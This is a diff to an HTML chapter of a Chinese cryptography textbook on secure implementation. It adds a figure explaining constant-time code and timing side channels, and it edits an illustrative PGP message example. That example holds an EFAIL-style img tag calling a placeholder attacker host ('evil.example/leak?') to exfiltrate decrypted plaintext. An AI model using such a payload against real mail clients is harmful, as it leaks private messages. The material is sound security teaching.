@@ -51,7 +51,26 @@
     <main class="main-content">
         <h1>第18章 安全实现实践</h1>
 
-        <figure id="fig-18" class="paper-figure"></figure>
+        <figure id="fig-18" class="paper-figure">
+          <svg viewBox="0 0 900 300" role="img" aria-labelledby="fig-18-title" xmlns="http://www.w3.org/2000/svg" font-family="system-ui,'PingFang SC',sans-serif">
+            <title id="fig-18-title">分支实现与常量时间实现：执行时间是否随秘密数据变化</title>
+            <text x="220" y="34" text-anchor="middle" font-size="13" font-weight="700" fill="#b91c1c">分支实现：时间随秘密变化</text>
+            <text x="680" y="34" text-anchor="middle" font-size="13" font-weight="700" fill="#115e59">常量时间：执行时间恒定</text>
+            <rect x="40" y="60" width="360" height="200" rx="16" fill="#fee2e2" stroke="#ef4444"/>
+            <text x="60" y="102" font-size="13" fill="#475569">secret == 1</text>
+            <rect x="60" y="114" width="120" height="24" rx="6" fill="#ef4444"/><text x="192" y="132" font-size="12" fill="#b91c1c">快</text>
+            <text x="60" y="186" font-size="13" fill="#475569">secret == 0</text>
+            <rect x="60" y="198" width="300" height="24" rx="6" fill="#ef4444"/><text x="370" y="216" font-size="12" fill="#b91c1c">慢</text>
+            <rect x="500" y="60" width="360" height="200" rx="16" fill="#ccfbf1" stroke="#14b8a6"/>
+            <text x="520" y="102" font-size="13" fill="#475569">secret == 1</text>
+            <rect x="520" y="114" width="210" height="24" rx="6" fill="#14b8a6"/>
+            <text x="520" y="186" font-size="13" fill="#475569">secret == 0</text>
+            <rect x="520" y="198" width="210" height="24" rx="6" fill="#14b8a6"/>
+            <text x="680" y="248" text-anchor="middle" font-size="13" fill="#115e59">两条路径耗时相同</text>
+            <text x="450" y="290" text-anchor="middle" font-size="13" fill="#475569">时间差会被攻击者用来逐比特推断密钥（时序侧信道）</text>
+          </svg>
+          <figcaption><b>图 18.</b> 常量时间实现。只要某个操作的耗时取决于秘密数据，攻击者就能通过大量测量的时间差逐步还原密钥。因此 MAC 比较、表项选择、模幂等敏感运算都要求用时与秘密无关。</figcaption>
+        </figure>
 
         <p>我们来做一个思想实验。假设你是一个刚入职的工程师，你的任务是实现一个TLS 1.3客户端。你很认真——认真读了RFC 8446的每一页，认真调用了正确的加密库API，写了详尽的单元测试。一切测试都通过了。然后你把代码提交到生产环境。</p>
 
@@ -272,7 +291,7 @@ key_data    = KDF(master_key, "data-encryption", session_id);</code></pre>
 
         <pre><code>-----BEGIN PGP MESSAGE-----
 ...
-<img src="https://evil.com/leak?"/>
+&lt;img src="https://evil.example/leak?"&gt;
 解密后的原文
 ...
 -----END PGP MESSAGE-----</code></pre>
